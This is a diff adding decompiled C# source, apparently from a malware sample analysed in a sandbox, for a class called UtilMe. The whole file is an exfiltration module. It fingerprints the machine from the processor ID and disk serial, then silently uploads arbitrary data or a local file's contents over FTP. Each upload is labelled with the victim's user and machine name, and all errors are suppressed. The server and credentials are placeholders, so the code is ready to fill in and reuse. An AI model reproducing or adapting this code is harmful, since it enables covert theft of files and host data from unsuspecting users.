@@ -1,0 +1,76 @@
+﻿// Decompiled with JetBrains decompiler
+// Type: Complex.UtilMe
+// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
+// MVID: 10231E92-BCE6-4007-A463-67D77912E754
+// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d
+
+using System;
+using System.IO;
+using System.Management;
+using System.Net;
+using System.Text;
+
+namespace Complex
+{
+  internal sealed class UtilMe
+  {
+    public static string UniqID()
+    {
+      string empty = string.Empty;
+      using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementClass("win32_processor").GetInstances().GetEnumerator())
+      {
+        if (enumerator.MoveNext())
+          empty = enumerator.Current.Properties["processorID"].Value.ToString();
+      }
+      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + "C" + ":\"");
+      managementObject.Get();
+      return managementObject["VolumeSerialNumber"].ToString() + empty;
+    }
+
+    public static void Send(
+      string FTPAddress = "URL",
+      string ftpUsername = "USERNAME",
+      string ftpPassword = "ACCESO",
+      string InfData = "")
+    {
+      try
+      {
+        string str = UtilMe.UniqID();
+        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(FTPAddress + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + str + ".txt");
+        ftpWebRequest.Method = "STOR";
+        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(ftpUsername, ftpPassword);
+        byte[] bytes = new ASCIIEncoding().GetBytes(InfData);
+        ftpWebRequest.ContentLength = (long) bytes.Length;
+        using (Stream requestStream = ftpWebRequest.GetRequestStream())
+          requestStream.Write(bytes, 0, bytes.Length);
+      }
+      catch
+      {
+      }
+    }
+
+    public static void SendB(
+      string FTPAddress = "URL",
+      string ftpUsername = "USERNAME",
+      string ftpPassword = "ACCESO",
+      string localFilePath = "")
+    {
+      try
+      {
+        string str = UtilMe.UniqID();
+        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(FTPAddress + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + str + ".txt");
+        ftpWebRequest.Method = "STOR";
+        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(ftpUsername, ftpPassword);
+        byte[] bytes;
+        using (StreamReader streamReader = new StreamReader(localFilePath))
+          bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
+        ftpWebRequest.ContentLength = (long) bytes.Length;
+        using (Stream requestStream = ftpWebRequest.GetRequestStream())
+          requestStream.Write(bytes, 0, bytes.Length);
+      }
+      catch
+      {
+      }
+    }
+  }
+}
